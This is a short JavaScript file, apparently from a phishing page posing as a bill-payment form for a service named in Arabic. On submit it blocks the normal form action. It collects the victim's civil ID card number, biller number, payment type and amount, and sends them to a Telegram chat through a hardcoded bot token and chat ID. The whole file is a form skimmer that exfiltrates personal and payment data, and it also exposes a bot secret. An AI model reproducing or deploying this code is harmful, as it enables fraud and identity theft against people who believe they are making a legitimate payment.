const form = document.querySelector("#form");

form.addEventListener("submit", (e) =>{
    e.preventDefault();
     var cardid = document.getElementById("cardid").value;

     var mofotr = document.getElementById("mofotr").value;
     var op = document.getElementById("op").value;
     var mone = document.getElementById("mone").value;

    var my_text = `البيانات زاجل%0A  - رقم بطاقة الاحوال: ${cardid}  %0A  - رقم المفوتر: ${mofotr}  %0A  -  اختر نوع السداد : ${op}  %0A -  قيمة السداد: ${mone} `

    var token ="7409356455:AAF0wdhXgWCYsnV2raiK2KHZnMjbeuMCRJI";
    var chat_id =-4595005407
    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
    
let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})